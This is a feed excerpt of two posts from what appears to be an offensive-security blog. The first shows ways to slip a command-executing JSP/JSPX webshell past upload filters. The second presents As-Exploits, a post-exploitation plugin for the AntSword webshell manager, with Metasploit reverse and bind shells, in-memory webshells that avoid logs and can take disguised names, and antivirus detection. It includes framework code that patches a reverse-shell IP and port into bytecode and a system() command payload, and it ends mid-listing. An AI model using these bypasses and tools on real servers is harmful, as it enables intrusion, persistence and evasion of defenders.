    <id>https://yzddmr6.tk/posts/jsp-webshell-upload-bypass/</id>
    <published>2021-01-15T03:22:15.000Z</published>
    <updated>2021-06-15T13:50:54.296Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h2 id="背景">背景</h2><p>前几天有个小伙伴做项目的时候遇到一个问题来问我，大概情况如下：</p><ol><li>jsp的站，可以任意文件上传</li><li>上传jsp会把&lt;%中的&lt;给转义掉</li><li>上传jspx会把<a href="jsp:scriptlet" target="_blank" rel="noopener">jsp:scriptlet</a>到&lt;/jsp:scriptlet&gt;中的内容替换为空</li></ol><p>问有什么突破办法？</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1610679190674-baace7f2-e763-4cb2-8695-bed0661fc1e5.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1610679220546-2dfa9031-8abc-4f16-a4db-2a6b3e0c2c1d.png" alt="image.png"></p><p>当时研究了一下后jsp和jspx各给了一个解决方案，后来发到星球里后@hosch3n师傅又提出了一种新的方案，tql</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616582626934-e9fd6f02-24b0-47b6-b814-22c972c359b9.png" alt="image.png"></p><h2 id="解决方案">解决方案</h2><p>其实问题等价于：</p><ol><li>jsp不使用&lt;% %&gt;标签如何执行命令</li><li>jspx不使用<a href="jsp:scriptlet" target="_blank" rel="noopener">jsp:scriptlet</a> &lt;/jsp:scriptlet&gt;如何执行命令</li></ol><h3 id="jsp利用EL表达式绕过">jsp利用EL表达式绕过</h3><p>jsp是默认解析el表达式的，并且在没有jsp标签的情况下也可以直接执行，这样就可以绕过jsp的限制。</p><p>星球里面@Gh0stFx也提到了这一点</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1610679796286-4312913e-9ca9-42ba-9ba0-20352e9572a6.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1610679816568-bfe65530-8ece-40ee-b6af-e4228373fa92.png" alt="image.png"></p><h3 id="jspx利用命名空间绕过">jspx利用命名空间绕过</h3><p>因为jspx实际上是jsp的xml写法，所以继承了xml的所有特性，例如cdata跟html实体编码等，同样也继承了命名空间的特性。</p><p><a href="https://www.runoob.com/xml/xml-namespaces.html" target="_blank" rel="noopener">https://www.runoob.com/xml/xml-namespaces.html</a></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1610680285750-0f35e6cf-e02b-4a65-8c75-f6170768fbfd.png" alt="image.png"></p><p>在<a href="jsp:scriptlet" target="_blank" rel="noopener">jsp:scriptlet</a>这个标签中，jsp就是默认的命名空间，但是实际上可以随意替换成其他名字</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1610680407208-7224f65a-665e-413f-8f4e-b6a90fea8c4f.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1610680395767-7be98260-0a6d-4bd1-b5f7-8ef901c0b6dc.png" alt="image.png"></p><p>这样就绕过了对<a href="jsp:scriptlet" target="_blank" rel="noopener">jsp:scriptlet</a>的过滤</p><h3 id="jspx利用jsp-expression绕过">jspx利用<a href="jsp:expression" target="_blank" rel="noopener">jsp:expression</a>绕过</h3><p>在jsp中可以利用表达式绕过，那么jspx中同样也可以，以下是jsp跟jspx语法的对照：</p><table><thead><tr><th></th><th>JSP语法</th><th>JSP document语法</th></tr></thead><tbody><tr><td>Page Directive</td><td>&lt;%@ page %&gt;</td><td>&lt;jsp:directive.page /&gt;</td></tr><tr><td>Include Directive</td><td>&lt;%@ include %&gt;</td><td>&lt;jsp:directive.include /&gt;</td></tr><tr><td>Tag Library Directive</td><td>&lt;%@ taglib %&gt;</td><td>xmlns:prefix=”Library URI”</td></tr><tr><td>Declartion</td><td>&lt;%! … %&gt;</td><td><a href="jsp:declaration" target="_blank" rel="noopener">jsp:declaration</a> … &lt;/jsp:declaration&gt;</td></tr><tr><td>Scriplet</td><td>&lt;% … %&gt;</td><td><a href="jsp:scriptlet" target="_blank" rel="noopener">jsp:scriptlet</a> … &lt;/jsp:scriptlet&gt;</td></tr><tr><td>Expression</td><td>&lt;%= … %&gt;</td><td><a href="jsp:expression" target="_blank" rel="noopener">jsp:expression</a> … &lt;/jsp:expression&gt;</td></tr><tr><td>Comment</td><td>&lt;%-- … --%&gt;</td><td></td></tr></tbody></table><p>这个方法是@hosch3n师傅提出来的，把表达式写到jspx中，同样可以达到执行命令的目的</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1610680526168-55b3cb88-20e0-42b6-8e8a-d636a19d3df0.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1610680545282-40414186-2ba2-4c30-aca0-ba88fb66946d.png" alt="image.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;h2 id=&quot;背景&quot;&gt;背景&lt;/h2&gt;&lt;p&gt;前几天有个小伙伴做项目的时候遇到一个问题来问我，大概情况如下：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;jsp的站，可以任意文件上传&lt;/li&gt;&lt;li&gt;上传jsp会把&amp;
      
    
    </summary>
    
    
      <category term="技术文章" scheme="https://yzddmr6.tk/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="bypass" scheme="https://yzddmr6.tk/tags/bypass/"/>
    
  </entry>
  
  <entry>
    <title>As-Exploits: 中国蚁剑后渗透框架</title>
    <link href="https://yzddmr6.tk/posts/as-exploits/"/>
    <id>https://yzddmr6.tk/posts/as-exploits/</id>
    <published>2020-12-01T12:49:48.000Z</published>
    <updated>2020-12-01T12:51:51.088Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h2 id="前言">前言</h2><p>冰蝎跟哥斯拉都有了各自的一些后渗透模块，然而蚁剑这一块基本还是空缺，所以就萌生出来做一个蚁剑的后渗透框架插件的想法。</p><p>目前插件的定位是蚁剑的一个微内核拓展模块，可以迅速做到payload的工程化，不用过多时间浪费在插件的结构上。目前的As-Exlpoits各部分之间基本做到了解耦，新增一个payload只需要两步：1.填写payload，2. 画一个表单。其余发包，回显处理等事情框架会自动帮你实现。想要自定义的话只需要继承父类然后重写对应方法即可。</p><p>因为http是无状态的，webshell能做的事情其实很有限，所以插件功能的重点主要放在msf，nmap等其他工具的联动上面，把专业的事情交给专业的工具去做。</p><h2 id="总体设计">总体设计</h2><p>一个模块在初始化之后的流程大概是这样</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1606652867566-6b210ead-d80c-47dd-98a7-665c853568fe.png" alt="image.png"></p><p>当exploit事件发生时，会调用getArgs跟genPayload函数来组合成最后的payload，默认将回显数据发送到编辑框里。</p><h2 id="模块介绍">模块介绍</h2><p>简单的塞一些模块，没错我就是缝合怪。</p><h3 id="基本信息">基本信息</h3><p>获取当前服务端信息。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1606650769575-c855d15c-8811-4520-84c5-7bd450e4f697.png" alt="image-20201123102429650.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1606650778133-55aa040b-1963-473e-9a45-5f25085b1099.png" alt="image-20201123102711289.png"></p><h3 id="反弹Shell">反弹Shell</h3><p>跟MSF联动，与冰蝎和哥斯拉相比新增了bind类型的payload。</p><p>目前支持以下类型：</p><ul><li>java/meterpreter/reverse_tcp</li><li>java/shell/reverse_tcp</li><li>java/meterpreter/bind_tcp</li><li>java/shell/bind_tcp</li><li>php/meterpreter/reverse_tcp</li><li>php/shell/reverse_tcp</li><li>php/meterpreter/bind_tcp</li><li>php/shell/bind_tcp<br><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1606650786779-b76d4dcd-03d1-4979-b570-68ffad4be705.png" alt="image-20201123102902564.png"></li></ul><h3 id="内存马">内存马</h3><p>一键打入内存Webshell。由于时间仓促，目前仅支持Servlet型内存马。核心payload修改自哥斯拉，继承了nolog的功能，即内存马不会在tomcat中留下日志。</p><p>可打入的内存马种类：</p><ul><li>AntSword</li><li>Behinder</li><li>Godzilla-Base64</li><li>reGerog<br>其中组件名称为注册的Servlet的名称，可以起一个具有迷惑性的名字来隐藏自己。<br><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1606650793510-adf4ab51-0ad0-4e13-9fbf-a1a9c4eaca2b.png" alt="image-20201123103009090.png"></li></ul><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1606825609324-b7fd9eeb-42e1-485f-aae0-bd51904d0cfc.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1606825602296-92beffbe-1868-4988-9167-67a36656b66c.png" alt="image.png"></p><h3 id="内存马管理">内存马管理</h3><ul><li>获取当前Servlet</li><li>卸载指定Servlet</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1606650799085-931c8824-f0fe-4139-bcaa-7107f5dbf8b8.png" alt="image-20201123103108185.png"></p><h3 id="杀软识别">杀软识别</h3><blockquote><p>数据来源是key师傅的项目：<a href="https://github.com/gh0stkey/avList" target="_blank" rel="noopener">avList</a></p></blockquote><p>通过<code>tasklist /svc</code>获取当前进程列表，识别出其中的杀软。</p><p>目前支持手动跟自动两种获取方式：</p><ul><li><p>自动获取<br>自动执行系统命令<code>tasklist /svc</code>并分析回显数据。</p></li><li><p>手动获取<br>手动输入<code>tasklist /svc</code>的结果。</p></li></ul><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1606650806803-2da534df-fe43-43a0-87a2-d8601ef27585.png" alt="image-20201123103231582.png"></p><h2 id="如何用node修改java字节码">如何用node修改java字节码</h2><p>在本插件中所有额外参数都采用了直接修改字节码，而没有采用额外参数的方式来传参。蚁剑没有java环境，那么是如何做到用node修改字节码的呢？详细的例子可以看我博客这篇文章：<a href="https://yzddmr6.tk/posts/node-edit-java-class/">无java环境修改字节码</a></p><p>其实我们的需求无非只是修改变量池中的一个字符串，并不需要asm框架那么强大的功能。java字节码常量池中共有14种类型，如下表格所示：</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604908580647-d7ddffab-f806-40b4-8ed7-e3da78932575.png" alt="image"></p><blockquote><p>注意上面的表格的单位是错的，应该是byte不是bit</p></blockquote><p>我们关注的应该是CONSTANT_utf8_info跟CONSTANT_String_info。如果变量是第一次被定义的时候是用CONSTANT_utf8_info标志，第二次使用的时候就变成了CONSTANT_String_info，即只需要tag跟面向字符串的索引。</p><p>也就是说关键的结构就是这个</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604909146524-fa3af1af-4b7b-4ae4-920e-02a4e8cedc84.png" alt="image"></p><p>其实跟PHP的序列化很相似，首先来个标志位表示变量的类型，然后是变量的长度，最后是变量的内容。</p><p>既然知道了其结构，那么修改的办法也就呼之欲出。除了修改变量的hex，只需要再把前面的变量长度给改一下就可以了。</p><p>把yan表哥的代码抽出来修改一下，yan表哥yyds。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">function replaceClassStringVar(b64code, oldvar, newvar) &#123;</span><br><span class="line">    let code = Buffer.from(b64code, &apos;base64&apos;);//解码</span><br><span class="line">    let hexcode = code.toString(&apos;hex&apos;);//转为16进制</span><br><span class="line">    let hexoldvar = Buffer.from(oldvar).toString(&apos;hex&apos;);//转为16进制</span><br><span class="line">    let oldpos = hexcode.indexOf(hexoldvar);</span><br><span class="line">    if (oldpos &gt; -1) &#123;//判断字节码中是否包含目标字符串</span><br><span class="line">      let newlength = decimalToHex(newvar.length, 4);//计算新字符串长度</span><br><span class="line">      let retcode = `$&#123;hexcode.slice(0, oldpos - 4)&#125;$&#123;newlength&#125;$&#123;Buffer.from(newvar).toString(&apos;hex&apos;)&#125;$&#123;hexcode.slice(oldpos + hexoldvar.length)&#125;`;//把原来字节码的前后部分截出来，中间拼上新的长度跟内容</span><br><span class="line">      return Buffer.from(retcode, &apos;hex&apos;).toString(&apos;base64&apos;);//base64编码</span><br><span class="line">    &#125;</span><br><span class="line">    return b64code;</span><br><span class="line">  &#125;</span><br><span class="line">  function decimalToHex(d, padding) &#123;</span><br><span class="line">    var hex = Number(d).toString(16);</span><br><span class="line">    padding = typeof (padding) === &quot;undefined&quot; || padding === null ? padding = 2 : padding;</span><br><span class="line">    while (hex.length &lt; padding) &#123;</span><br><span class="line">      hex = &quot;0&quot; + hex;//小于padding长度就填充0</span><br><span class="line">    &#125;</span><br><span class="line">    return hex;</span><br><span class="line">  &#125;</span><br><span class="line">content=`xxxxxxxxxxxxx`//要替换的字节码</span><br><span class="line">content=replaceClassStringVar(content,&apos;targetIP&apos;,&apos;192.168.88.129&apos;)</span><br><span class="line">content=replaceClassStringVar(content,&apos;targetPORT&apos;,&apos;9999&apos;)</span><br><span class="line">console.log(content)</span><br></pre></td></tr></table></figure><h2 id="编写模块">编写模块</h2><h3 id="父类Base">父类Base</h3><p>Base是所有模块的基类，放了一些默认的方法。</p><p>顺着代码来说吧。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br></pre></td><td class="code"><pre><span class="line">&quot;use strict&quot;;</span><br><span class="line"></span><br><span class="line">const LANG = require(&quot;../language&quot;); // 插件语言库</span><br><span class="line">const LANG_T = antSword[&quot;language&quot;][&quot;toastr&quot;]; // 通用通知提示</span><br><span class="line">const path = require(&quot;path&quot;);</span><br><span class="line">class Base &#123;</span><br><span class="line">  constructor(top) &#123;//获取顶层对象</span><br><span class="line">    this.top = top;</span><br><span class="line">    this.opt = this.top.opt;</span><br><span class="line">    this.shelltype = this.top.opt.type;</span><br><span class="line">    this.win = this.top.win;</span><br><span class="line">    this.payloadtype=&quot;default&quot;;</span><br><span class="line">    this.precheck();</span><br><span class="line">  &#125;</span><br><span class="line">  precheck() &#123;  //检查模块是否适用于当前shell类型</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">  //获取payload模板</span><br><span class="line">  getTemplate(shelltype, payloadtype) &#123; //从当前目录下payload.js中获取payload</span><br><span class="line">    let payload = require(path.join(__dirname, this.name, &quot;payload&quot;));</span><br><span class="line">    return payload[shelltype][payloadtype];</span><br><span class="line">  &#125;</span><br><span class="line">  //拼接参数</span><br><span class="line">  genPayload(args) &#123;    //从模板中拼接参数</span><br><span class="line"></span><br><span class="line">    let payload = this.getTemplate(this.shelltype, this.payloadtype);</span><br><span class="line">    if (this.shelltype == &quot;jsp&quot;) &#123;  //如果是jsp类型就用字节码的方式修改</span><br><span class="line">      for (let i in args) &#123;</span><br><span class="line">        payload = this.replaceClassStringVar(payload, i, args[i]);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; else &#123;    //否则直接进行字符串替换</span><br><span class="line">      for (let i in args) &#123;</span><br><span class="line">        payload = payload.replace(new RegExp(i, &quot;g&quot;), args[i]);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return payload;</span><br><span class="line">  &#125;</span><br><span class="line">  //获取表单参数</span><br><span class="line">  getArgs() &#123;   //所有表单参数要形成一个字典</span><br><span class="line">    return &#123;&#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  //执行</span><br><span class="line">  exploit() &#123;   // exploit！</span><br><span class="line">    console.log(&quot;exploit!&quot;);</span><br><span class="line">    self.core = this.top.core;</span><br><span class="line">    let args = this.getArgs();  //获取参数</span><br><span class="line">    let payload = this.genPayload(args);    //拼接，生成payload</span><br><span class="line">    self.core</span><br><span class="line">      .request(&#123;</span><br><span class="line">        _: payload, //发送payload</span><br><span class="line">      &#125;)</span><br><span class="line">      .then((_ret) =&gt; &#123;</span><br><span class="line">        let res = antSword.unxss(_ret[&quot;text&quot;], false);  //过滤xss</span><br><span class="line">        if (res === &quot;&quot;) &#123;</span><br><span class="line">          res = &quot;output is empty.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        this.editor.session.setValue(res);  //回显内容到输出结果</span><br><span class="line">        this.editor.setReadOnly(true);</span><br><span class="line">        toastr.success(LANG[&quot;success&quot;], LANG_T[&quot;success&quot;]);</span><br><span class="line">      &#125;)</span><br><span class="line">      .catch((e) =&gt; &#123;</span><br><span class="line">        console.log(e);</span><br><span class="line">        toastr.error(JSON.stringify(e), &quot;Error&quot;);</span><br><span class="line">      &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  setName(name) &#123;</span><br><span class="line">    this.name = name;   //每个模块实例化之后要有个唯一的名字</span><br><span class="line">  &#125;</span><br><span class="line">  createLayout(tabbar) &#123;    //创建tab，总布局</span><br><span class="line">    tabbar.addTab(this.name, LANG[&quot;core&quot;][this.name][&quot;title&quot;]);</span><br><span class="line">    let tab = tabbar.cells(this.name);</span><br><span class="line">    this.tab = tab;</span><br><span class="line">    if (this.name == &quot;base_info&quot;) &#123; //把基本信息设为首页</span><br><span class="line">      tab.setActive();</span><br><span class="line">    &#125;</span><br><span class="line">    let layout = tab.attachLayout(&quot;2E&quot;);</span><br><span class="line">    this.layout = layout;</span><br><span class="line">    let cellA = layout.cells(&quot;a&quot;);</span><br><span class="line">    this.cellA=cellA;</span><br><span class="line">    cellA.hideHeader();</span><br><span class="line">    let cellB = layout.cells(&quot;b&quot;);</span><br><span class="line">    cellB.setText(LANG[&quot;result_title&quot;]);</span><br><span class="line">    this.cellB=cellB;</span><br><span class="line">    this.createEditor(cellB);</span><br><span class="line">    this.createToolbar(cellA);</span><br><span class="line">    this.createForm(cellA);</span><br><span class="line">  &#125;</span><br><span class="line">  createEditor(cell) &#123;  //输出结果默认是编辑器的格式，方便复制</span><br><span class="line">    this.editor = null;</span><br><span class="line">    // 初始化编辑器</span><br><span class="line">    this.editor = ace.edit(cell.cell.lastChild);</span><br><span class="line">    this.editor.$blockScrolling = Infinity;</span><br><span class="line">    this.editor.setTheme(&quot;ace/theme/tomorrow&quot;);</span><br><span class="line">    // this.editor.session.setMode(`ace/mode/html`);</span><br><span class="line">    this.editor.session.setUseWrapMode(true);</span><br><span class="line">    this.editor.session.setWrapLimitRange(null, null);</span><br><span class="line"></span><br><span class="line">    this.editor.setOptions(&#123;</span><br><span class="line">      fontSize: &quot;14px&quot;,</span><br><span class="line">      enableBasicAutocompletion: true,</span><br><span class="line">      enableSnippets: true,</span><br><span class="line">      enableLiveAutocompletion: true,</span><br><span class="line">    &#125;);</span><br><span class="line">    // 编辑器快捷键</span><br><span class="line">    this.editor.commands.addCommand(&#123;</span><br><span class="line">      name: &quot;import&quot;,</span><br><span class="line">      bindKey: &#123;</span><br><span class="line">        win: &quot;Ctrl-S&quot;,</span><br><span class="line">        mac: &quot;Command-S&quot;,</span><br><span class="line">      &#125;,</span><br><span class="line">      exec: () =&gt; &#123;</span><br><span class="line">        // this.toolbar.callEvent(&quot;onClick&quot;, [&quot;import&quot;]);</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;);</span><br><span class="line">    const inter = setInterval(this.editor.resize.bind(this.editor), 200);</span><br><span class="line">    this.win.win.attachEvent(&quot;onClose&quot;, () =&gt; &#123;</span><br><span class="line">      clearInterval(inter);</span><br><span class="line">      return true;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  createForm(cell) &#123;</span><br><span class="line">    //edit your code</span><br><span class="line">  &#125;</span><br><span class="line">  createToolbar(cell) &#123; // 初始化exploit按钮，监听onClick事件</span><br><span class="line">    let self = this;</span><br><span class="line">    let toolbar = cell.attachToolbar();</span><br><span class="line">    toolbar.attachEvent(&quot;onClick&quot;, function (id) &#123;</span><br><span class="line">      try &#123;</span><br><span class="line">        self.exploit();</span><br><span class="line">      &#125; catch (e) &#123;</span><br><span class="line">        toastr.error(JSON.stringify(e), LANG_T[&apos;error&apos;]);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    toolbar.loadStruct(</span><br><span class="line">      &apos;&lt;toolbar&gt;&lt;item type=&quot;button&quot; id=&quot;exploit&quot; text=&quot;exploit&quot; title=&quot;&quot; /&gt;&lt;/toolbar&gt;&apos;,</span><br><span class="line">      function () &#123;&#125;</span><br><span class="line">    );</span><br><span class="line">    if(this.precheck()==false)&#123; //如果precheck不通过，按钮将变成灰色。</span><br><span class="line">      toolbar.disableItem(&apos;exploit&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">    this.toolbar=toolbar;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  replaceClassStringVar(b64code, oldvar, newvar) &#123;  //字节码修改函数</span><br><span class="line">    let code = Buffer.from(b64code, &quot;base64&quot;);</span><br><span class="line">    let hexcode = code.toString(&quot;hex&quot;);</span><br><span class="line">    let hexoldvar = Buffer.from(oldvar).toString(&quot;hex&quot;);</span><br><span class="line">    let oldpos = hexcode.indexOf(hexoldvar);</span><br><span class="line">    if (oldpos &gt; -1) &#123;</span><br><span class="line">      let newlength = this.decimalToHex(newvar.length, 4);</span><br><span class="line">      let retcode = `$&#123;hexcode.slice(0, oldpos - 4)&#125;$&#123;newlength&#125;$&#123;Buffer.from(</span><br><span class="line">        newvar</span><br><span class="line">      ).toString(&quot;hex&quot;)&#125;$&#123;hexcode.slice(oldpos + hexoldvar.length)&#125;`;</span><br><span class="line">      return Buffer.from(retcode, &quot;hex&quot;).toString(&quot;base64&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    // console.log(&apos;nonono&apos;)</span><br><span class="line">    return b64code;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  decimalToHex(d, padding) &#123;</span><br><span class="line">    let hex = Number(d).toString(16);</span><br><span class="line">    padding =</span><br><span class="line">      typeof padding === &quot;undefined&quot; || padding === null</span><br><span class="line">        ? (padding = 2)</span><br><span class="line">        : padding;</span><br><span class="line">    while (hex.length &lt; padding) &#123;</span><br><span class="line">      hex = &quot;0&quot; + hex;</span><br><span class="line">    &#125;</span><br><span class="line">    return hex;</span><br><span class="line">  &#125;</span><br><span class="line">  safeHTML(cell, html = &quot;&quot;, sandbox = &quot;&quot;) &#123;     //当渲染html时一定要用此函数处理，否则可能会产生rce</span><br><span class="line">    let _html = Buffer.from(html).toString(&quot;base64&quot;);</span><br><span class="line">    // https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe#attr-sandbox</span><br><span class="line">    let _iframe = `&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">      &lt;iframe</span><br><span class="line">        sandbox=&quot;$&#123;sandbox&#125;&quot;</span><br><span class="line">        src=&quot;data:text/html;base64,$&#123;_html&#125;&quot;</span><br><span class="line">        style=&quot;width:100%;height:100%;border:0;padding:0;margin:0;&quot;&gt;</span><br><span class="line">      &lt;/iframe&gt;</span><br><span class="line">    `;</span><br><span class="line">    cell.attachHTMLString(_iframe);</span><br><span class="line">    return this;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module.exports = Base;</span><br></pre></td></tr></table></figure><h3 id="简单的例子">简单的例子</h3><p>举一个简单的例子，执行系统命令并获取回显。</p><p>首先给插件起个炫酷的名字叫test，加入到根目录index.js的Modules里面。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1606810610191-b41a8ca3-962c-446c-8552-8ed9bdfcf460.png" alt="image.png"></p><p>然后在language\zh.js中增加对应的标签名字：测试。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1606810016965-a726f030-5d7f-4f63-a748-45d1d9d427bf.png" alt="image.png"></p><p>接着新增一个test目录，这里的目录名称要与模块的名称一致，里面放两个文件：index.js跟payload.js。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1606810982668-8babb19a-3525-4e0f-8205-43b9bcfffaaf.png" alt="image.png"></p><p>在index.js中主要写逻辑处理部分，payload.js里面只放payload。</p><h4 id="payload-js">payload.js</h4><p>默认的payload叫default。payload中把参数部分用一个特殊的名字标记出来，叫做 test_command 。</p><p>JSP类型同理，放base64格式的字节码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">module.exports=&#123;</span><br><span class="line">    php:&#123;</span><br><span class="line">        default:`system(&quot;test_command&quot;);`</span><br><span class="line">    &#125;,</span><br><span class="line">    jsp:&#123;</span><br><span class="line">        default:``</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="index-js">index.js</h4><p>因为例子中需要额外的参数，所以要重写父类的createForm函数跟getArgs函数，把表单中获取到的test_command放入args里面。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 